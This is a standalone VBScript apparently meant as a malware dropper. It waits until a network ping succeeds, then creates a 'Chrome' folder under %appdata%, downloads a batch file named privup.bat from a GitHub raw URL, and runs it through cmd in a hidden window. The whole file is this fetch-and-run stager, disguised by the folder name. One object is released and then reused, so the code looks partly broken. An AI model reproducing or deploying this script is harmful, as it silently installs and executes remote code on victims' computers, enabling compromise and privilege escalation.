Dim MyLoop,strComputer, objPing, objStatus, i, objFile, objFSO, objHTTP, strFile, strMsg

MyLoop = True
While MyLoop = True
    strComputer = "google.com"
    Set objPing = GetObject("winmgmts:{impersonationLevel=impersonate}!\\").ExecQuery _
    ("select * from Win32_PingStatus where address = '" & strComputer & "'")
    For Each objStatus in objPing
        If objStatus.Statuscode = 0 Then
            MyLoop = False
            Call MyProgram()
            wscript.quit
        End If
    Next
    Pause(3) 'To sleep for 10 secondes
Wend

 Sub Pause(NSeconds)
    Wscript.Sleep(NSeconds*1000)
 End Sub



Sub Download(myURL, myPath)
    Const ForReading = 1, ForWriting = 2, ForAppending = 8
    Set objFSO = CreateObject( "Scripting.FileSystemObject" )
    If objFSO.FolderExists( myPath ) Then
        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then
        strFile = myPath
    End If
    Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
    objHTTP.Open "GET", myURL, False
    objHTTP.Send
    For i = 1 To LenB( objHTTP.ResponseBody )
        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
    Next
    objFile.Close()
End Sub




Sub MyProgram()
Set WshShell = CreateObject("WScript.Shell")
Home = WshShell.ExpandEnvironmentStrings("%appdata%")

WshShell.Run "cmd /c mkdir %appdata%\Chrome", 0, True
Set WshShell = Nothing

file = Home & "\Chrome\privup.bat"
    
Download "https://raw.githubusercontent.com/4V4loon/tools/master/privup.bat", file

cmd="cmd /c "
WshShell.Run cmd & file, 0, True
Set WshShell = Nothing

End Sub
